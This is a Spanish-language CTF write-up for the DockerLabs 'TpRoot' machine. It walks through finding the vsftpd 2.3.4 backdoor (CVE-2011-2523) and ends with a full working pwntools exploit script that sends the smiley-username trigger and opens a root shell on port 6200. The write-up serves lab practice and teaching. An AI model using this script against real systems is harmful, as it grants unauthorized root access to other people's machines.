---
layout: post
title: "TpRoot - Dockerlabs - Linux - Fácil"
date: 2025-08-24
img: /assets/img/tproot/banner.png
---
TProot es una máquina Linux de nivel fácil en DockerLabs que nos permite practicar enumeración básica y explotación de vulnerabilidades conocidas.



**Enumeración**

Comenzamos con un reconocimiento de la máquina objetivo.

![img1](/secnotes/assets/img/tproot/1.png)

![img2](/secnotes/assets/img/tproot/2.png) 

Con la herramienta **searchsploit** veremos si existe alguna vulnerabilidad sobre el servicio _vsdtpd 2.3.4_

![img3](/secnotes/assets/img/tproot/3.png)
 
Encontramos un script de ejecución de comandos a través de una puerta trasera (backdoor). Esto se ejecuta conectándonos a un servicio aparentemente legitimo (FTP, HTTP, etc), enviamos un trigger (Usuario especial, header, token, etc) el servicio abre un puerto oculto o devuelve una shell, y al conectarnos a ese puerto podemos ejecutar comandos.

Esta corresponde a la vulnerabilidad CVE-2011-2523. En Exploit database encontramos un script para comprometer este servicio.

![img4](/secnotes/assets/img/tproot/4.png) 

Para ejecutarlo vamos a crear un entorno aislado con Python3 

![img5](/secnotes/assets/img/tproot/5.png) 

Esto sirve para poder instalar paquetes independientes en el sistema sin comprometer las librerías de nuestro Kali. Es útil para trabajar con distintas versiones de las librerías.

Ejecutamos el script que descargamos pero nos da un error. Indica que no tenemos la librería de telnet en nuestro sistema, esto pasó por que la versión actual de Python (3.13.5) elimino estas librerias que traía por defecto. 
 
![img6](/secnotes/assets/img/tproot/6.png) 

![img7](/secnotes/assets/img/tproot/7.png) 


con el siguiente comando podemos ejecutar directamente la versión 3.11.13 de Python desde un contenedor de docker en nuestro entorno aislado

`docker run -it --rm -v "$PWD":/work -w /work python:3.11 bash
python3 –version`

![img8](/secnotes/assets/img/tproot/8.png)

 
Al ejecutar el script obtendremos automaticamente una shell como usuario root en la máquina víctima.

![img10](/secnotes/assets/img/tproot/10.png)



**Opcion 2:**

Podemos modificar el script para reemplazar telnet por pwntools, así el script funcionará con las versiones actuales de python 

```python
from pwn import *
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    print('[✦] Exiting...')
    exit(0)

signal(SIGINT, handler)

parser = argparse.ArgumentParser()
parser.add_argument("host", help="Target IP address", type=str)
args = parser.parse_args()

host = args.host
portFTP = 21

user = b"USER nergal:)"
password = b"PASS pass"

ftp = remote(host, portFTP, timeout=5.0)
banner = ftp.recvline(timeout=5.0)
print(f"[✦] Banner: {banner.strip().decode(errors='ignore')}")
ftp.sendline(user)
ftp.recvuntil(b"pass", timeout=3.0)  # más laxo que "password."
ftp.sendline(password)
ftp.close()

try:
    shell = remote(host, 6200, timeout=5.0)
    print("[✦] Success, shell opened")
    print("[i] Type 'exit' to quit")
    shell.interactive()
    shell.close()
except Exception as e:
    print(f"[!] Error: {e}")```
